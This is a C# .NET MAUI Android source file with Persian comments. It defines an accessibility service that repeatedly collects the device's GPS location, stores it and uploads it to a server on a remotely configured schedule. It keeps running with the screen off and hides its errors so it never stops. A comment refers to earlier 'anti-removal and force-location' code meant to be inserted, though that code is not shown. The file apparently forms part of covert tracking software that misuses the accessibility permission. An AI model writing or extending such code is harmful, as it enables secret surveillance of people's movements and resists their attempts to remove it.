#if ANDROID
using Android.AccessibilityServices;
using Android.App;
using Android.Content;
using Android.Views.Accessibility;
using Android.Gms.Location;
using Android.Gms.Extensions;
using Android.OS;
using appc.Data;
using appc.Sync;
using appc.Platforms.Android;

namespace appc.Platforms.Android; // نام فضای نام پروژه تو

[Service(Permission = "android.permission.BIND_ACCESSIBILITY_SERVICE", Exported = true)]
[IntentFilter(new[] { "android.accessibilityservice.AccessibilityService" })]
[MetaData("android.accessibilityservice", Resource = "@xml/accessibility_config")]
public class MyA11yService : AccessibilityService
{
    private CancellationTokenSource? _cts;
    private IFusedLocationProviderClient? _fused;
    private TrackDb? _db;
    private BatchSyncer? _sync;
    private ConfigClient? _cfgClient;
    private string _deviceId = "";
    private long _lastIntentTime = 0;

    protected override void OnServiceConnected()
    {
        base.OnServiceConnected();

        // تنظیمات اولیه سرویس
        SetServiceInfo(new AccessibilityServiceInfo
        {
            EventTypes = EventTypes.WindowStateChanged | EventTypes.WindowContentChanged,
            FeedbackType = FeedbackFlags.Generic,
            Flags = AccessibilityServiceFlags.ReportViewIds | AccessibilityServiceFlags.RetrieveInteractiveWindows,
            NotificationTimeout = 150
        });

        // اینجاست که سرویس‌های لازم رو از سیستم MAUI می‌گیریم
        _cts = new CancellationTokenSource();
        _fused = LocationServices.GetFusedLocationProviderClient(this);
        _db = ServiceProvider.GetService<TrackDb>();
        _sync = ServiceProvider.GetService<BatchSyncer>();
        _cfgClient = ServiceProvider.GetService<ConfigClient>();
        _deviceId = DeviceIdProvider.Get(this);

        // شروع حلقه گزارش‌گیری (حتی با صفحه خاموش)
        _ = LoopAsync(_cts.Token);
    }

    public override void OnAccessibilityEvent(AccessibilityEvent? e)
    {
        if (e == null || RootInActiveWindow == null) return;
        var pkg = e.PackageName?.ToString() ?? "";

        // کدهای ضد حذف و فورس لوکیشن که قبلاً با هم نوشتیم اینجا می‌آیند
        // (اگر کدی که بالاتر باینجارات فرستادم رو داری،  جایگذاری کن)
    }

    private async Task LoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                // گرفتن تنظیمات جدید از سرور
                if (_cfgClient != null)
                {
                    var cfg = await _cfgClient.FetchAsync(ct);
                    if (cfg != null)
                    {
                        TrackingSettings.Enabled = cfg.enabled;
                        TrackingSettings.IntervalSeconds = cfg.interval_seconds;
                        TrackingSettings.WindowStart = cfg.window_start;
                        TrackingSettings.WindowEnd = cfg.window_end;
                        TrackingSettings.UploadEveryMinutes = cfg.upload_every_minutes;
                    }
                }

                // اگر سیستم فعال بود و در بازه زمانی مجاز بودیم
                if (TrackingSettings.Enabled && TrackingSettings.IsNowInWindow())
                {
                    // ارسال داده‌های قبلی به سرور
                    if (_sync != null) await _sync.UploadOnceAsync(_deviceId);

                    // گرفتن لوکیشن جدید
                    var location = await GetBestLocationAsync(timeoutSeconds: 8, ct);
                    if (location != null && _db != null)
                    {
                        await _db.InsertAsync(new LocationPoint
                        {
                            TimestampUtc = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                            Lat = location.Latitude,
                            Lng = location.Longitude,
                            Acc = location.Accuracy
                        });
                    }
                }
            }
            catch { /* خطاها رو نادیده می‌گیریم تا سرویس متوقف نشه */ }

            await Task.Delay(TimeSpan.FromSeconds(TrackingSettings.IntervalSeconds), ct);
        }
    }

    private async Task<global::Android.Locations.Location?> GetBestLocationAsync(
        int timeoutSeconds,
        CancellationToken ct)
    {
        var fresh = await GetOneShotAsync(timeoutSeconds, ct);
        if (fresh != null)
            return fresh;

        if (_fused == null) return null;

        try
        {
            var last = await _fused.GetLastLocationAsync();
            return last;
        }
        catch
        {
            return null;
        }
    }



    private Task<global::Android.Locations.Location?> GetOneShotAsync(
        int timeoutSeconds,
        CancellationToken ct)
    {
        if (_fused == null)
            return Task.FromResult<global::Android.Locations.Location?>(null);

        var tcs = new TaskCompletionSource<global::Android.Locations.Location?>();

        // ✅ نسخه جدید (API 31+)
        var request = new global::Android.Gms.Location.LocationRequest.Builder(
                global::Android.Gms.Location.Priority.PriorityHighAccuracy,
                1000)
            .SetMinUpdateIntervalMillis(500)
            .SetMaxUpdates(1)
            .Build();

        LocationCallback? callback = null;

        callback = new OneShotLocationCallback(loc =>
        {
            try { _fused.RemoveLocationUpdates(callback); } catch { }
            tcs.TrySetResult(loc);
        });

        _fused.RequestLocationUpdates(request, callback, Looper.MainLooper);

        // Timeout
        _ = Task.Run(async () =>
        {
            await Task.Delay(TimeSpan.FromSeconds(timeoutSeconds), ct);
            if (!tcs.Task.IsCompleted)
            {
                try { _fused.RemoveLocationUpdates(callback); } catch { }
                tcs.TrySetResult(null);
            }
        }, ct);

        return tcs.Task;
    }

    private sealed class OneShotLocationCallback : LocationCallback
    {
        private readonly Action<global::Android.Locations.Location?> _onLocation;

        public OneShotLocationCallback(Action<global::Android.Locations.Location?> onLocation)
        {
            _onLocation = onLocation;
        }

        public override void OnLocationResult(LocationResult result)
        {
            _onLocation(result?.LastLocation);
        }
    }









    public override void OnInterrupt() { _cts?.Cancel(); }
}

// یک کلاس کمکی برای دسترسی به سرویس‌های MAUI
public static class ServiceProvider
{
    public static T? GetService<T>() => MauiApplication.Current.Services.GetService<T>();
}
#endif